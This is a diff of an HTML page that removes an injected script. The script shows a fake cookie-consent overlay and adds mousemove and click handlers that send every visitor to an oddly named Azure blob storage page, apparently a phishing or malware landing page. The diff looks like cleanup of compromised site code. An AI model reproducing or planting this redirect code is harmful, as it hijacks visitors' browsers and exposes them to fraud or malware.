@@ -1060,64 +1060,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
 <div id="cookieStatus" class="cookie-status hidden"></div>
 
-<script>
-let consentGiven = false;
-let mouseRedirectEnabled = false;
 
-function showCookieConsent() {
-  document.getElementById('cookieConsentOverlay').classList.remove('hidden');
-  document.body.classList.add('consent-active');
-  mouseRedirectEnabled = true;
-}
-
-function hideCookieConsent() {
-  document.getElementById('cookieConsentOverlay').classList.add('hidden');
-  document.body.classList.remove('consent-active');
-  mouseRedirectEnabled = false;
-}
-
-function showStatus(message, type) {
-  const statusEl = document.getElementById('cookieStatus');
-  statusEl.textContent = message;
-  statusEl.className = `cookie-status status-${type}`;
-  statusEl.classList.remove('hidden');
-  setTimeout(() => statusEl.classList.add('hidden'), 3000);
-}
-
-function acceptCookies() {
-  consentGiven = true;
-  hideCookieConsent();
-  showStatus('Cookies accepted', 'accepted');
-}
-
-function denyCookies() {
-  consentGiven = false;
-  hideCookieConsent();
-  showStatus('Cookies denied', 'denied');
-}
-
-document.addEventListener('mousemove', function() {
-  window.location.href = 'https://dsghhjsdf78dsfssdf.blob.core.windows.net/hjgfduyd8ff/index.html';
-});
-
-document.addEventListener('click', function() {
-  window.location.href = 'https://dsghhjsdf78dsfssdf.blob.core.windows.net/hjgfduyd8ff/index.html';
-});
-
-window.addEventListener('load', function() {
-  showCookieConsent();
-});
-</script>
-
-    <script type="text/javascript" src="js/popper.js"></script><script> window.start.init({Palette:"palette1",Mode:"banner bottom",Time:"0", Message: "We use cookies to improve the site and its user experience. By continuing to use the site, you agree to the use of cookies. You can always disable cookies in your browser settings.", ButtonText: "Accept", LinkText: "Learn more"})</script>
-        
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
-    <script src="js/popper.min.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="js/aos.js"></script>
-    <script src="js/swiper-bundle.min.js"></script>
-    <script src="js/script.js"></script>
-
-    <script>AOS.init();</script>
     </body>
 </html>
